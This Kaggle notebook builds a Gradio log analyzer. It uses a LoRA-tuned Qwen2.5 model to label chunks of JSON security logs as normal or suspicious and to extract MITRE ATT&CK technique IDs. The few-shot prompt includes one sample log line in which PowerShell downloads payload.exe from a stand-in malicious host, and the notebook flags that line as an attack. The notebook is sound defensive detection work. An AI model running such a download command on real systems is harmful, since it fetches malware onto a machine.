In [ ]:
# Cell 1: Check GPU availability
!nvidia-smi

In [ ]:
# Cell 2: Install required packages
print("📦 Installing dependencies...")
!pip install -q gradio transformers peft accelerate tqdm
print("✅ Dependencies installed!")

In [ ]:
# Cell 3: Import required libraries
import gradio as gr
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import PeftModel
import json
import re
from typing import Dict, List, Tuple
import os
from tqdm.auto import tqdm
from collections import Counter
import time
import sys
from datetime import datetime

print("✅ Libraries imported successfully!")
print(f"📊 PyTorch version: {torch.__version__}")
print(f"📊 CUDA available: {torch.cuda.is_available()}")
if torch.cuda.is_available():
    print(f"📊 GPU: {torch.cuda.get_device_name(0)}")
sys.stdout.flush()

In [ ]:
# Cell 4: Configuration - AUTO-DETECT MODEL PATH
# ============================================================================
# 🎯 Model and Processing Configuration
# ============================================================================

import os
from pathlib import Path

BASE_MODEL = "Qwen/Qwen2.5-1.5B-Instruct"
MODEL_PATH = None

# Processing Configuration (based on fine-tuning specs)
CHUNK_CONFIG = {
    "max_events_per_chunk": 20,      # Balanced for speed and accuracy
    "max_input_chars": 6000,         # Truncate input to this length (from metrics.ipynb)
    "max_length_tokens": 4096,       # Maximum tokens for prompt + input (dynamic)
    "max_new_tokens": 256,           # Maximum tokens to generate (from metrics.ipynb)
    "overlap_events": 0,             # No overlap (clean separation)
}

# Auto-detect model path
print("🔍 Searching for fine-tuned model...")

if os.path.exists("/kaggle/input"):
    print(f"📂 Scanning /kaggle/input/ recursively...\n")
    
    for root, dirs, files in os.walk("/kaggle/input"):
        if "adapter_config.json" in files or "adapter_model.safetensors" in files:
            MODEL_PATH = root
            print(f"✅ Found fine-tuned model at: {MODEL_PATH}")
            print(f"📂 Model files found:")
            for f in sorted(files)[:10]:
                print(f"   ✓ {f}")
            if len(files) > 10:
                print(f"   ... and {len(files) - 10} more files")
            break
    
    if MODEL_PATH is None:
        print("❌ Could not find fine-tuned model!")
        print("\n📌 Please add your model dataset via 'Add Data' in Kaggle")
        MODEL_PATH = "/kaggle/input/fine-tuned-model"
else:
    MODEL_PATH = "./fine_tuned_model"
    print(f"⚠️ Not on Kaggle. Using local path: {MODEL_PATH}")

print(f"\n📊 Configuration:")
print(f"   Model path: {MODEL_PATH}")
print(f"   Base model: {BASE_MODEL}")
print(f"   Device: {'CUDA (GPU)' if torch.cuda.is_available() else 'CPU'}")
print(f"\n📦 Chunking Strategy:")
print(f"   Max events per chunk: {CHUNK_CONFIG['max_events_per_chunk']}")
print(f"   Max input chars: {CHUNK_CONFIG['max_input_chars']:,}")
print(f"   Max tokens (prompt+input): {CHUNK_CONFIG['max_length_tokens']}")
print(f"   Max new tokens (output): {CHUNK_CONFIG['max_new_tokens']}")
print(f"   Overlap: {CHUNK_CONFIG['overlap_events']} events")
print(f"\n⚡ Performance Estimate:")
print(f"   For 1000 events: ~{1000 // CHUNK_CONFIG['max_events_per_chunk']} chunks (~{(1000 // CHUNK_CONFIG['max_events_per_chunk']) * 10 / 60:.1f} min)")
print(f"\n📋 Using FEW-SHOT prompting format (matches training)")
print("\n✅ Configuration complete!")

In [ ]:
# Cell 5: Define Advanced LogAnalyzer Class
# ============================================================================
# Professional Log Analysis System with Chunking & Aggregation
# ============================================================================

class LogAnalyzer:
    """
    Enterprise-grade log analyzer with intelligent chunking for large logs.
    
    Features:
    - Smart chunking (preserves JSON integrity)
    - Batch processing with progress tracking
    - Result aggregation across all chunks
    - MITRE ATT&CK technique mapping
    """
    
    def __init__(self, model_path: str, base_model: str, chunk_config: dict):
        """Initialize the log analyzer."""
        self.model_path = model_path
        self.base_model = base_model
        self.chunk_config = chunk_config
        self.model = None
        self.tokenizer = None
        self.device = "cuda" if torch.cuda.is_available() else "cpu"
        
    def load_model(self):
        """Load the fine-tuned model and tokenizer."""
        print(f"🔄 Loading model from {self.model_path}...")
        print(f"📊 Using device: {self.device}")
        
        # Load base model (use 'dtype' instead of deprecated 'torch_dtype')
        print(f"   📥 Loading base model: {self.base_model}")
        base_model = AutoModelForCausalLM.from_pretrained(
            self.base_model,
            dtype=torch.float16 if self.device == "cuda" else torch.float32,
            device_map="auto" if self.device == "cuda" else None,
            trust_remote_code=True
        )
        
        # Load LoRA adapters
        print(f"   📥 Loading LoRA adapters from: {self.model_path}")
        self.model = PeftModel.from_pretrained(base_model, self.model_path)
        self.model.eval()
        
        # Load tokenizer
        print(f"   📥 Loading tokenizer...")
        self.tokenizer = AutoTokenizer.from_pretrained(
            self.base_model,
            trust_remote_code=True
        )
        self.tokenizer.pad_token = self.tokenizer.eos_token
        
        print(f"✅ Model loaded successfully!")
        if self.device == "cuda":
            print(f"📊 GPU Memory: {torch.cuda.memory_allocated() / 1024**3:.2f} GB")
        
        return True
    
    def chunk_logs(self, log_data: dict) -> List[dict]:
        """
        Intelligently chunk large logs into smaller pieces.
        
        Strategy:
        - Split by event count (not tokens) to preserve JSON integrity
        - Each chunk gets its own metadata
        - No truncation of individual events
        
        Args:
            log_data: Full log JSON with metadata and logs array
            
        Returns:
            List of chunk dicts, each with metadata and subset of logs
        """
        if "logs" not in log_data:
            raise ValueError("Log data must contain 'logs' array")
        
        all_logs = log_data["logs"]
        metadata = log_data.get("metadata", {})
        
        chunks = []
        max_events = self.chunk_config["max_events_per_chunk"]
        
        # Split logs array into chunks
        for i in range(0, len(all_logs), max_events):
            chunk_logs = all_logs[i:i + max_events]
            
            # Create chunk with metadata
            chunk = {
                "metadata": {
                    **metadata,
                    "chunk_index": len(chunks),
                    "chunk_start": i,
                    "chunk_end": min(i + max_events, len(all_logs)),
                    "total_events": len(all_logs),
                    "chunk_events": len(chunk_logs)
                },
                "logs": chunk_logs
            }
            chunks.append(chunk)
        
        return chunks
    
    def format_prompt(self, log_array: list) -> str:
        """Format logs into few-shot prompt matching training format."""
        
        # Convert log array to JSON string
        input_text = json.dumps(log_array, separators=(',', ':'))
        
        # TRUNCATE INPUT IF TOO LONG (from metrics.ipynb)
        MAX_INPUT_CHARS = self.chunk_config.get("max_input_chars", 6000)
        if len(input_text) > MAX_INPUT_CHARS:
            input_text = input_text[:MAX_INPUT_CHARS] + "... [truncated]"
        
        # FEW-SHOT PROMPT: Matches training format exactly
        prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.

Output format:
Status: Normal OR Status: Suspicious
Reason: Brief explanation

### Example 1:
Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
Response:
Status: Normal
Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.

### Example 2:
Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
Response:
Status: Suspicious
Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).

### Now analyze this log:
Input: {input_text}
Response:
"""
        return prompt
    
    def parse_output(self, output: str) -> Dict:
        """Parse model output to extract status, reason, and MITRE techniques."""
        result = {
            "status": "Unknown",
            "reason": "",
            "mitre_techniques": [],
            "raw_output": output
        }
        
        # Clean output for better parsing
        output_clean = output.strip()
        
        # Try JSON parsing first (most reliable)
        try:
            # Look for complete JSON objects
            json_patterns = [
                r'\{[^{}]*?"(?:normal|suspicious|status)"[^{}]*?\}',
                r'\{[\s\S]*?"result"[\s\S]*?\}',
                r'\{[\s\S]*?\}'
            ]
            
            for pattern in json_patterns:
                json_match = re.search(pattern, output_clean, re.IGNORECASE)
                if json_match:
                    try:
                        json_data = json.loads(json_match.group())
                        
                        # Check various JSON structures
                        if "normal" in json_data:
                            result["status"] = "Normal" if json_data["normal"] else "Suspicious"
                        elif "suspicious" in json_data:
                            result["status"] = "Suspicious" if json_data["suspicious"] else "Normal"
                        elif "status" in json_data:
                            status_val = str(json_data["status"]).lower()
                            if "normal" in status_val:
                                result["status"] = "Normal"
                            elif "suspicious" in status_val or "malicious" in status_val:
                                result["status"] = "Suspicious"
                        
                        if "result" in json_data and isinstance(json_data["result"], dict):
                            res = json_data["result"]
                            if "normal" in res:
                                result["status"] = "Normal" if res["normal"] else "Suspicious"
                            if "suspicious" in res:
                                result["status"] = "Suspicious" if res["suspicious"] else "Normal"
                            if "reason" in res:
                                result["reason"] = str(res["reason"])
                            if "mitre_techniques" in res:
                                result["mitre_techniques"] = res["mitre_techniques"]
                        
                        if "reason" in json_data:
                            result["reason"] = str(json_data["reason"])
                        if "mitre_techniques" in json_data:
                            result["mitre_techniques"] = json_data["mitre_techniques"]
                        
                        if result["status"] != "Unknown":
                            break
                    except:
                        continue
        except:
            pass
        
        # Text-based parsing - EXACT format from training (from metrics.ipynb)
        if result["status"] == "Unknown":
            # Primary pattern: "Status: Normal" or "Status: Suspicious" (training format)
            status_patterns = [
                r'Status:\s*(Normal|Suspicious)',  # PRIMARY: Exact training format
                r'status:\s*(normal|suspicious)',  # Lowercase variant
                r'(?:Classification|Verdict)\s*[:-]\s*(Normal|Suspicious|Benign|Malicious)',
            ]
            
            for pattern in status_patterns:
                match = re.search(pattern, output_clean, re.IGNORECASE)
                if match:
                    matched = match.group(1).lower()
                    
                    if matched == "true":
                        result["status"] = "Normal"
                    elif matched == "false":
                        result["status"] = "Suspicious"
                    elif "normal" in matched or "benign" in matched or "no malicious" in matched:
                        result["status"] = "Normal"
                    elif "suspicious" in matched or "malicious" in matched:
                        result["status"] = "Suspicious"
                    else:
                        result["status"] = match.group(1).capitalize()
                    
                    if result["status"] != "Unknown":
                        break
        
        # Strong keyword-based fallback
        if result["status"] == "Unknown":
            lower = output_clean.lower()
            
            # Count suspicious indicators
            suspicious_keywords = ['suspicious', 'attack', 'malicious', 'threat', 'exploit', 'compromise']
            normal_keywords = ['normal', 'benign', 'legitimate', 'no threat', 'no malicious']
            
            suspicious_count = sum(1 for kw in suspicious_keywords if kw in lower)
            normal_count = sum(1 for kw in normal_keywords if kw in lower)
            
            if suspicious_count > normal_count and suspicious_count > 0:
                result["status"] = "Suspicious"
            elif normal_count > suspicious_count and normal_count > 0:
                result["status"] = "Normal"
        
        # Extract reason - EXACT format from training (from metrics.ipynb)
        if not result["reason"]:
            reason_patterns = [
                r'Reason:\s*([^\n]+)',  # PRIMARY: Training format "Reason: ..."
                r'reason:\s*([^\n]+)',  # Lowercase variant
                r'(?:Explanation|Analysis|Because)[:\s]+["\']?([^"\n]+?)["\']?(?:\n|$)',
            ]
            for pattern in reason_patterns:
                match = re.search(pattern, output_clean, re.DOTALL | re.IGNORECASE)
                if match:
                    result["reason"] = match.group(1).strip()[:500]
                    break
        
        # Extract MITRE techniques (unchanged)
        mitre_pattern = r'T\d{4}(?:\.\d{3})?'
        result["mitre_techniques"] = list(set(re.findall(mitre_pattern, output_clean)))
        
        return result
    
    def analyze_chunk(self, chunk: dict, chunk_num: int, total_chunks: int) -> Dict:
        """Analyze a single chunk."""
        chunk_start_time = time.time()
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        print(f"\n{'='*80}")
        print(f"[{timestamp}] 📊 CHUNK {chunk_num + 1}/{total_chunks} - {chunk['metadata']['chunk_events']} events")
        print(f"{'='*80}")
        sys.stdout.flush()
        
        # Device verification
        device_name = "GPU" if str(self.model.device).startswith("cuda") else "CPU"
        print(f"🖥️  Device: {device_name} ({self.model.device})")
        sys.stdout.flush()
        
        # Format prompt (pass only logs array, not full chunk metadata)
        print(f"📝 Formatting prompt...")
        sys.stdout.flush()
        prompt = self.format_prompt(chunk['logs'])
        
        # Tokenize with dynamic max_length (from metrics.ipynb)
        print(f"🔤 Tokenizing...")
        sys.stdout.flush()
        max_len = self.chunk_config.get("max_length_tokens", 4096)
        inputs = self.tokenizer(
            prompt,
            return_tensors="pt",
            truncation=True,
            max_length=max_len
        )
        print(f"   Input tokens: {inputs['input_ids'].shape[1]} (max: {max_len})")
        sys.stdout.flush()
        
        inputs = {k: v.to(self.model.device) for k, v in inputs.items()}
        
        # Generate with reduced max_new_tokens (from metrics.ipynb)
        max_new = self.chunk_config.get("max_new_tokens", 256)
        print(f"🤖 Generating response (max {max_new} new tokens)...")
        sys.stdout.flush()
        gen_start = time.time()
        
        with torch.no_grad():
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=max_new,
                temperature=0.7,
                do_sample=True,
                top_p=0.9,
                pad_token_id=self.tokenizer.eos_token_id
            )
        
        gen_time = time.time() - gen_start
        print(f"✅ Generation complete in {gen_time:.2f}s")
        sys.stdout.flush()
        
        # Decode
        print(f"📖 Decoding response...")
        sys.stdout.flush()
        generated_text = self.tokenizer.decode(
            outputs[0][inputs['input_ids'].shape[1]:],
            skip_special_tokens=True
        )
        print(f"   Generated {len(generated_text)} characters")
        sys.stdout.flush()
        
        # Parse
        print(f"🔍 Parsing output...")
        sys.stdout.flush()
        result = self.parse_output(generated_text)
        result["chunk_info"] = {
            "chunk_index": chunk_num,
            "events": chunk['metadata']['chunk_events'],
            "start": chunk['metadata']['chunk_start'],
            "end": chunk['metadata']['chunk_end']
        }
        
        chunk_total_time = time.time() - chunk_start_time
        print(f"\n✅ CHUNK {chunk_num + 1} COMPLETE:")
        print(f"   Status: {result['status']}")
        print(f"   MITRE: {len(result['mitre_techniques'])} techniques")
        print(f"   Time: {chunk_total_time:.2f}s (gen: {gen_time:.2f}s)")
        print(f"{'='*80}\n")
        sys.stdout.flush()
        
        return result
    
    def aggregate_results(self, chunk_results: List[Dict]) -> Dict:
        """
        Aggregate results from all chunks into unified analysis.
        
        Returns comprehensive summary with:
        - Overall verdict
        - Statistics
        - All MITRE techniques
        - Combined reasoning
        """
        total_chunks = len(chunk_results)
        
        # Count statuses
        status_counts = Counter(r["status"] for r in chunk_results)
        suspicious_chunks = status_counts.get("Suspicious", 0)
        normal_chunks = status_counts.get("Normal", 0)
        unknown_chunks = status_counts.get("Unknown", 0)
        
        # Overall verdict: ANY suspicious chunk makes it suspicious
        if suspicious_chunks > 0:
            overall_status = "Suspicious"
        elif normal_chunks == total_chunks:
            overall_status = "Normal"
        else:
            overall_status = "Uncertain"
        
        # Collect all MITRE techniques (deduplicated)
        all_techniques = []
        for result in chunk_results:
            all_techniques.extend(result["mitre_techniques"])
        unique_techniques = sorted(set(all_techniques))
        
        # Combine reasons from suspicious chunks
        suspicious_reasons = [
            f"Chunk {r['chunk_info']['chunk_index'] + 1}: {r['reason']}"
            for r in chunk_results
            if r['status'] == 'Suspicious' and r['reason']
        ]
        
        # Build comprehensive reason
        if overall_status == "Suspicious":
            combined_reason = f"Analysis of {total_chunks} chunks revealed suspicious activity in {suspicious_chunks} chunk(s).\n\n"
            combined_reason += "\n\n".join(suspicious_reasons[:3])  # Top 3
            if len(suspicious_reasons) > 3:
                combined_reason += f"\n\n... and {len(suspicious_reasons) - 3} more suspicious chunks"
        elif overall_status == "Normal":
            combined_reason = f"All {total_chunks} chunks analyzed showed normal activity with no indicators of compromise."
        else:
            combined_reason = f"Analysis inconclusive. {unknown_chunks} chunks returned uncertain results."
        
        # Build aggregated result
        aggregated = {
            "overall_status": overall_status,
            "combined_reason": combined_reason,
            "mitre_techniques": unique_techniques,
            "statistics": {
                "total_chunks": total_chunks,
                "suspicious_chunks": suspicious_chunks,
                "normal_chunks": normal_chunks,
                "unknown_chunks": unknown_chunks,
                "total_techniques": len(unique_techniques),
            },
            "chunk_results": chunk_results  # Keep individual results
        }
        
        return aggregated
    
    def analyze_large_log(self, log_data: dict, progress_callback=None) -> Dict:
        """
        Main entry point: Analyze large log with automatic chunking.
        
        Args:
            log_data: Full log JSON
            progress_callback: Optional function(current, total, message) for progress updates
            
        Returns:
            Aggregated analysis results
        """
        if not self.model:
            raise RuntimeError("Model not loaded. Call load_model() first.")
        
        start_time = time.time()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Step 1: Chunk the log
        print(f"\n{'='*80}")
        print(f"📂 CHUNKING LARGE LOG")
        print(f"   Started: {timestamp}")
        print(f"{'='*80}")
        sys.stdout.flush()
        
        chunks = self.chunk_logs(log_data)
        print(f"✅ Created {len(chunks)} chunks from {len(log_data.get('logs', []))} events")
        print(f"   Events per chunk: {self.chunk_config['max_events_per_chunk']}")
        print(f"   Estimated time: ~{len(chunks) * 10:.0f}s ({len(chunks) * 10 / 60:.1f} min)")
        sys.stdout.flush()
        
        # Step 2: Analyze each chunk
        print(f"\n{'='*80}")
        print(f"🔍 ANALYZING CHUNKS (Total: {len(chunks)})")
        print(f"{'='*80}")
        sys.stdout.flush()
        
        chunk_results = []
        
        for i, chunk in enumerate(chunks):
            if progress_callback:
                progress_callback(i, len(chunks), f"Analyzing chunk {i+1}/{len(chunks)}")
            
            result = self.analyze_chunk(chunk, i, len(chunks))
            chunk_results.append(result)
            
            # Progress update every 10 chunks
            if (i + 1) % 10 == 0 or i == 0:
                elapsed = time.time() - start_time
                avg_time = elapsed / (i + 1)
                remaining = avg_time * (len(chunks) - i - 1)
                print(f"\n📈 PROGRESS: {i+1}/{len(chunks)} chunks ({100*(i+1)/len(chunks):.1f}%)")
                print(f"   Average: {avg_time:.2f}s/chunk")
                print(f"   Estimated remaining: {remaining/60:.1f} min\n")
                sys.stdout.flush()
        
        # Step 3: Aggregate results
        print(f"\n{'='*80}")
        print(f"📊 AGGREGATING RESULTS")
        print(f"{'='*80}")
        sys.stdout.flush()
        
        aggregated = self.aggregate_results(chunk_results)
        
        # Add timing info
        elapsed = time.time() - start_time
        aggregated["processing_time"] = {
            "total_seconds": round(elapsed, 2),
            "per_chunk_seconds": round(elapsed / len(chunks), 2)
        }
        
        print(f"✅ Analysis complete in {elapsed:.2f}s")
        print(f"📊 Overall Status: {aggregated['overall_status']}")
        print(f"🎯 MITRE Techniques: {len(aggregated['mitre_techniques'])}")
        print(f"{'='*80}")
        sys.stdout.flush()
        
        return aggregated

print("✅ LogAnalyzer class defined!")

In [ ]:
# Cell 6: Initialize Analyzer and UI Helper Functions
# ============================================================================
# Setup analyzer instance and Gradio interface handlers
# ============================================================================

# Initialize analyzer
analyzer = LogAnalyzer(
    model_path=MODEL_PATH,
    base_model=BASE_MODEL,
    chunk_config=CHUNK_CONFIG
)

# UI Helper Functions
def load_model_ui():
    """Load model button handler."""
    try:
        analyzer.load_model()
        return "✅ Model loaded successfully! Ready to analyze large logs."
    except Exception as e:
        return f"❌ Error loading model: {str(e)}"

def _process_log_data(log_data):
    """Shared processing logic for log data."""
    # Auto-detect and normalize structure
    if isinstance(log_data, list):
        print("📋 Detected direct array format")
        log_data = {"logs": log_data}
    elif isinstance(log_data, dict):
        if "logs" not in log_data:
            for alt_key in ["events", "records", "data", "log_entries"]:
                if alt_key in log_data:
                    print(f"📋 Detected '{alt_key}' key, normalizing to 'logs'")
                    log_data["logs"] = log_data[alt_key]
                    break
            else:
                array_keys = [k for k, v in log_data.items() if isinstance(v, list)]
                if array_keys:
                    print(f"📋 Found array key: {array_keys[0]}")
                    log_data = {"logs": log_data[array_keys[0]]}
                else:
                    return ("⚠️ Error", "Invalid format", f"Could not find logs array. Keys: {', '.join(log_data.keys())}", "", "")
    else:
        return ("⚠️ Error", "Invalid format", "JSON must be an array or object containing logs", "", "")
    
    total_events = len(log_data.get("logs", []))
    print(f"📊 Loaded {total_events:,} events")
    
    # Analyze
    results = analyzer.analyze_large_log(log_data)
    
    # Format results
    status_emoji = {"Suspicious": "🔴", "Normal": "🟢", "Uncertain": "⚠️"}.get(results["overall_status"], "❓")
    status_display = f"{status_emoji} {results['overall_status']}"
    
    stats = results["statistics"]
    stats_display = f"""📊 Analysis Statistics:
• Total Events: {total_events:,}
• Total Chunks: {stats['total_chunks']}
• Suspicious Chunks: {stats['suspicious_chunks']}
• Normal Chunks: {stats['normal_chunks']}
• Unknown Chunks: {stats['unknown_chunks']}
• Processing Time: {results['processing_time']['total_seconds']}s ({results['processing_time']['per_chunk_seconds']}s/chunk)
"""
    
    techniques_display = "\n".join([f"• {tech}" for tech in results["mitre_techniques"]]) if results["mitre_techniques"] else "None detected"
    
    chunk_details = "📋 Chunk-by-Chunk Breakdown:\n\n"
    for cr in results["chunk_results"]:
        info = cr["chunk_info"]
        chunk_details += f"Chunk {info['chunk_index'] + 1} (Events {info['start']}-{info['end']}):\n"
        chunk_details += f"  Status: {cr['status']}\n  Techniques: {len(cr['mitre_techniques'])}\n"
        if cr['reason']:
            chunk_details += f"  Reason: {cr['reason'][:200]}...\n"
        chunk_details += "\n"
    
    return (status_display, stats_display, results["combined_reason"], techniques_display, chunk_details)

def analyze_from_path_ui(file_path):
    """Analyze log from file path (for Kaggle datasets)."""
    try:
        if not file_path or not file_path.strip():
            return ("⚠️ Error", "No path provided", "Please enter a file path (e.g., /kaggle/input/your-dataset/file.json)", "", "")
        
        file_path = file_path.strip()
        
        if not os.path.exists(file_path):
            return ("⚠️ Error", "File not found", f"Could not find file at: {file_path}\n\nMake sure you've added the dataset in Kaggle.", "", "")
        
        print(f"📂 Reading file from path: {file_path}")
        print(f"📊 File size: {os.path.getsize(file_path) / (1024 * 1024):.2f} MB")
        
        with open(file_path, 'r', encoding='utf-8') as f:
            log_data = json.load(f)
        
        return _process_log_data(log_data)
        
    except json.JSONDecodeError as e:
        return ("❌ Error", "JSON Parse Error", f"Invalid JSON file: {str(e)}", "", "")
    except Exception as e:
        return ("❌ Error", "Processing Error", f"Error reading file: {str(e)}", "", "")

def analyze_large_log_ui(log_file):
    """Analyze log from file upload."""
    try:
        if log_file is None:
            return ("⚠️ Error", "No file uploaded", "Please upload a JSON log file", "", "")
        
        print(f"📂 Reading uploaded file: {log_file.name}")
        with open(log_file.name, 'r', encoding='utf-8') as f:
            log_data = json.load(f)
        
        return _process_log_data(log_data)
        
    except json.JSONDecodeError as e:
        return ("❌ Error", "JSON Parse Error", f"Invalid JSON file: {str(e)}", "", "")
    except Exception as e:
        return ("❌ Error", "Processing Error", f"Error during analysis: {str(e)}", "", "")

print("✅ Analyzer initialized and UI functions defined!")

In [ ]:
# Cell 7: Create Gradio Interface for Large Log Analysis
# ============================================================================
# Interactive UI with file upload, progress tracking, and detailed results
# ============================================================================

interface = gr.Blocks(title="MITRE ATT&CK Large Log Analyzer", theme=gr.themes.Soft())

with interface:
    gr.Markdown("""
    # 🛡️ MITRE ATT&CK Large Log Analyzer
    
    **Enterprise-Grade Log Analysis with Intelligent Chunking**
    
    Upload large JSON log files for automated MITRE ATT&CK technique detection.
    The analyzer automatically:
    - Splits logs into optimal chunks (configurable chunk size)
    - Preserves JSON object integrity
    - Analyzes each chunk individually
    - Aggregates results with comprehensive statistics
    - Shows real-time progress with timestamps
    """)
    
    # Model loading section
    with gr.Row():
        load_button = gr.Button("🔧 Load Model", variant="primary", size="lg")
        load_status = gr.Textbox(label="Model Status", value="Click 'Load Model' to initialize", interactive=False)
    
    load_button.click(fn=load_model_ui, outputs=load_status)
    
    gr.Markdown("---")
    gr.Markdown("""
    ### 📁 Choose Input Method
    
    **For large files (>10MB):** Upload as Kaggle dataset, then use file path option  
    **For small files (<10MB):** Use file upload below
    """)
    
    # File input methods
    with gr.Tabs():
        with gr.Tab("📂 From Kaggle Dataset (Recommended for Large Files)"):
            gr.Markdown("""
            **Steps:**
            1. Click **"+ Add Data"** (top right in Kaggle)
            2. Upload your log file as a dataset
            3. Copy the path: `/kaggle/input/your-dataset-name/your-file.json`
            4. Paste below and click Analyze
            """)
            file_path_input = gr.Textbox(label="File Path", placeholder="/kaggle/input/your-dataset/log_file.json", lines=1)
            analyze_path_button = gr.Button("🔍 Analyze from Path", variant="primary", size="lg")
        
        with gr.Tab("📤 Upload File (Small Files Only)"):
            gr.Markdown("⚠️ **Limit: ~10MB** - Larger files will timeout")
            log_file_input = gr.File(label="📁 Upload Log File (JSON)", file_types=[".json"], type="filepath")
            analyze_upload_button = gr.Button("🔍 Analyze Uploaded File", variant="primary", size="lg")
    
    gr.Markdown("### 📈 Analysis Results")
    
    # Results display
    with gr.Row():
        with gr.Column(scale=1):
            overall_status = gr.Textbox(label="Overall Status", lines=2, interactive=False)
        with gr.Column(scale=2):
            statistics_output = gr.Textbox(label="Statistics", lines=8, interactive=False)
    
    with gr.Row():
        combined_reason = gr.Textbox(label="Combined Analysis Reason", lines=5, interactive=False)
    
    with gr.Row():
        mitre_techniques = gr.Textbox(label="🎯 Detected MITRE ATT&CK Techniques", lines=10, interactive=False)
    
    with gr.Accordion("📋 Chunk-by-Chunk Details", open=False):
        chunk_details = gr.Textbox(label="Individual Chunk Results", lines=20, interactive=False)
    
    # Button handlers
    analyze_path_button.click(
        fn=analyze_from_path_ui,
        inputs=file_path_input,
        outputs=[overall_status, statistics_output, combined_reason, mitre_techniques, chunk_details]
    )
    
    analyze_upload_button.click(
        fn=analyze_large_log_ui,
        inputs=log_file_input,
        outputs=[overall_status, statistics_output, combined_reason, mitre_techniques, chunk_details]
    )
    
    # Example section
    gr.Markdown("""
    ---
    ### 📝 Expected JSON Format
    
    ```json
    {
        "metadata": {
            "scenario_name": "Your Scenario",
            "attack_phase": "execution"
        },
        "logs": [
            {
                "EventID": 1,
                "ProcessName": "example.exe",
                "CommandLine": "...",
                ...
            },
            ...
        ]
    }
    ```
    
    **Note:** The analyzer can handle logs of any size - it will automatically chunk them for optimal processing.
    """)

print("✅ Gradio interface created!")

In [ ]:
# Cell 8: Launch the Interface
# ============================================================================
# Start Gradio server with public sharing enabled (Kaggle optimized)
# ============================================================================

print("🚀 Launching Large Log Analyzer on Kaggle...")
print("📋 Instructions:")
print("  1. Click 'Load Model' button first")
print("  2. Upload your JSON log file")
print("  3. Click 'Analyze Large Log'")
print("  4. View aggregated results and chunk details")
print("\n⏳ Starting Gradio server... (this may take 10-20 seconds)")
print()

# Launch with Kaggle-specific settings
interface.launch(
    share=True,              # Creates public gradio.live URL
    debug=True,              # Show debug info for troubleshooting
    show_error=True,         # Display errors in UI
    server_name="0.0.0.0",   # Listen on all interfaces (Kaggle requirement)
    server_port=7860,        # Default Gradio port
    quiet=False              # Show all output messages
)